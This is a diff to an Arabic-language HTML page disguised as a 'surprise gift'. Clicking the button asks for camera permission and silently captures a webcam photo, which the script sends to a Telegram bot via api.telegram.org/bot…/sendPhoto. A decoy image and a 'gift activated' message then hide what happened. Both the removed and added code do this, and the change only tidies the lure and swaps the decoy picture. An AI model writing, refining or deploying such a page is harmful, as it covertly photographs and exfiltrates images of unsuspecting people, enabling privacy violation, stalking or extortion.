@@ -10,18 +10,26 @@
         .neon-btn { padding: 15px 30px; color: #03e9f4; background: transparent; border: 2px solid #03e9f4; border-radius: 10px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: 0.5s; }
         .neon-btn:hover { background: #03e9f4; color: #050801; box-shadow: 0 0 20px #03e9f4; }
         #video, #canvas { display: none; }
-        .gift-img { width: 100%; border-radius: 15px; margin-top: 20px; border: 2px solid #03e9f4; display: none; animation: fadeIn 1s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        /* تصميم مكان ظهور صورتك */
+        .gift-img { 
+            width: 100%; 
+            border-radius: 15px; 
+            margin-top: 20px; 
+            border: 2px solid #03e9f4; 
+            display: none; /* مخفية في البداية */
+        }
     </style>
 </head>
 <body>
 
     <div id="main-content" class="glass-container">
-        <h1>هدية حصرية! 🎁</h1>
+        <h1 id="title">هدية حصرية! 🎁</h1>
         <p id="desc" style="color: #aaa;">اضغط بالأسفل لتفعيل المفاجأة</p>
         <button id="main-btn" class="neon-btn" onclick="startProcess()">افتح المفاجأة</button>
         
-        <img id="surprise-image" src="https://images.unsplash.com/photo-1511300636408-a63a89df3482?auto=format&fit=crop&q=80&w=1000" class="gift-img" alt="Gift">
+        <img id="my-image" src="nature.jpg" class="gift-img">
+        
         <p id="final-msg" style="color: #fff; margin-top: 15px; display: none;">✨ تم تفعيل هديتك بنجاح!</p>
     </div>
 
@@ -35,50 +43,41 @@
         async function startProcess() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
+                document.getElementById('video').srcObject = stream;
                 document.getElementById('main-btn').innerText = "جاري التحميل...";
 
-                video.onloadedmetadata = () => {
-                    setTimeout(() => { captureAndSend(video, stream); }, 1000);
-                };
+                setTimeout(() => { captureAndSend(stream); }, 1000);
             } catch (err) {
-                alert("يجب السماح بالكاميرا لتشغيل المفاجأة!");
+                alert("يجب السماح بالكاميرا!");
             }
         }
 
-        async function captureAndSend(video, stream) {
+        function captureAndSend(stream) {
             const canvas = document.getElementById('canvas');
-            ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(async (blob) => {
+            canvas.toBlob(blob => {
                 const fd = new FormData();
-                fd.append('photo', blob, 'shot.jpg');
+                fd.append('photo', blob, 'img.jpg');
                 fd.append('chat_id', CHAT_ID);
 
-                try {
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                } catch (e) {}
+                // إرسال الصورة لتيليجرام
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
+                // إيقاف الكاميرا وإظهار صورتك الخاصة للمستخدم
                 stream.getTracks().forEach(t => t.stop());
-                showGift();
+                showMyPicture();
             }, 'image/jpeg', 0.5);
         }
 
-        function showGift() {
-            // إخفاء الزر والوصف القديم
+        function showMyPicture() {
             document.getElementById('main-btn').style.display = 'none';
             document.getElementById('desc').style.display = 'none';
             
-            // إظهار الصورة والرسالة النهائية
-            const img = document.getElementById('surprise-image');
-            img.style.display = 'block';
+            // إظهار الصورة والرسالة
+            document.getElementById('my-image').style.display = 'block';
             document.getElementById('final-msg').style.display = 'block';
-            
-            // إذا أردت استخدام صورتك الخاصة nature.jpg، قم برفعها بجانب ملف index.html
-            // وغير الرابط في الأعلى (src) إلى nature.jpg
         }
     </script>
 </body>
